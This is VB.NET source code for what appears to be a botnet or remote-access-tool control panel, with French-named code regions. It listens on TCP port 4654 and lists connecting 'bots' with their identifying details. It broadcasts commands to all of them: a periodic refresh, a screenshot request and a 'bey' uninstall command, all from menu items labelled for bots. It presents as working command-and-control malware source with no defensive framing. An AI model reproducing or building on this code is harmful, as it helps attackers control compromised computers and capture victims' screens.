Imports System.Net.Sockets
Imports System.Text

Public Class Form1

#Region "Configuration"

    Const Port = 4654

#End Region

#Region "Connexion Client/Server"

    Dim ID As String() = Nothing
    Dim cSocket As New System.Net.Sockets.TcpClient
    Dim sStream As NetworkStream
    Dim rData, clNO, StrServer As String
    Dim iCounter As Integer
    Dim cList As New Hashtable
    Dim sSocket As New TcpListener(Port)
    Dim mThread As Threading.Thread = New Threading.Thread(AddressOf Main)

    Sub Main()

        Dim sSocket As New TcpListener(Port)
        Dim cSocket As TcpClient
        Dim Counter As Integer

        sSocket.Start()

        Counter = 0

        MsgMe()

        While (True)

            Try

                Counter += 1

                cSocket = sSocket.AcceptTcpClient()
                Dim Bytes(10024) As Byte
                Dim dClient As String
                Dim nStream As NetworkStream = cSocket.GetStream()

                nStream.Read(Bytes, 0, CInt(cSocket.ReceiveBufferSize))
                dClient = System.Text.Encoding.ASCII.GetString(Bytes)
                dClient = dClient.Substring(0, dClient.IndexOf("$"))
                cList(dClient) = cSocket
                StrServer = dClient

                MsgMe()

            Catch ex As Exception

            End Try

        End While

    End Sub

    Public Sub MsgMe()

        If Me.InvokeRequired Then

            Me.Invoke(New MethodInvoker(AddressOf MsgMe))

        Else

            Try

                Dim Id() As String
                Id = StrServer.Split("*")

                BList.Items.Add(Id(0)).SubItems.Add(Id(1))
                BList.Items(BList.Items.Count - 1).SubItems.Add(Id(2))
                BList.Items(BList.Items.Count - 1).SubItems.Add(Id(3))

            Catch ex As Exception

            End Try

        End If

    End Sub

    Public Sub Brcst(ByVal Msg As String, ByVal bName As String, ByVal Flag As Boolean)

        Dim Item As DictionaryEntry

        For Each Item In cList

            Try

                Dim bSocket As TcpClient
                bSocket = CType(Item.Value, TcpClient)

                Dim bStream As NetworkStream = bSocket.GetStream()
                Dim bBytes As [Byte]()

                If Flag = True Then

                    bBytes = Encoding.ASCII.GetBytes(Msg)

                Else

                    bBytes = Encoding.ASCII.GetBytes(Msg)

                End If

                bStream.Write(bBytes, 0, bBytes.Length)
                bStream.Flush()

            Catch ex As Exception

            End Try

        Next

    End Sub

    Function User()

        Dim I As Integer

        For I = 0 To BList.SelectedItems.Count - 1

            User = (BList.SelectedItems(I).Text)

        Next

        Return User

    End Function

#End Region

#Region "Mouvement du Form"

    Dim Position_Souris_X As Integer
    Dim Position_Souris_Y As Integer
    Dim Variation_Position_Souris_X As Integer
    Dim Variation_Position_Souris_Y As Integer

    Sub SurfMouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles MyBase.MouseDown

        Position_Souris_X = e.X
        Position_Souris_Y = e.Y

    End Sub

    Sub SurfMouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles MyBase.MouseMove

        If MouseButtons = MouseButtons.Left Then

            Variation_Position_Souris_X = e.X - Position_Souris_X
            Variation_Position_Souris_Y = e.Y - Position_Souris_Y
            Me.Left = Me.Left + Variation_Position_Souris_X
            Me.Top = Me.Top + Variation_Position_Souris_Y

        End If

    End Sub

#End Region

    Private Sub Closei_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Closei.Click

        Me.Close()

    End Sub

    Private Sub Mini_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Mini.Click

        NIco.Visible() = True
        Me.Hide()

    End Sub

    Private Sub NIco_DoubleClick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NIco.DoubleClick

        Me.Show()
        NIco.Visible() = False

    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        Timer1.Interval = 20000
        Timer1.Enabled = True

        mThread.Start()
        sSocket.Stop()

    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick

        Dim U As Integer

        For U = 0 To BList.Items.Count - 1

            BList.Items.RemoveAt(0)

        Next

        Brcst("refresh", clNO, True)

    End Sub

    Private Sub ScreenshotToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ScreenshotToolStripMenuItem.Click

        Brcst(" screen", clNO, True)

    End Sub

    Private Sub UninstallBotsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallBotsToolStripMenuItem.Click

        Brcst(User() + " bey ", clNO, True)

    End Sub

End Class
